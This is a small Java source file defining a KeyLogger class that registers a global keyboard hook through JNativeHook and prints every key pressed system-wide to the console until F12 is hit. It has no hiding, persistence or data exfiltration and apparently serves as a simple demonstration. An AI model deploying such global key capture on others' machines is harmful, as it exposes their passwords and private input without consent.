/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jcommandline;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author GoD
 */
public class KeyLogger implements NativeKeyListener {
    public void main(){
        try{
        GlobalScreen.registerNativeHook();
        }
        catch(Exception e){
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (e.getKeyCode()==NativeKeyEvent.VK_F12){
            GlobalScreen.unregisterNativeHook();
        }
        else{
            System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        
    }
    
}
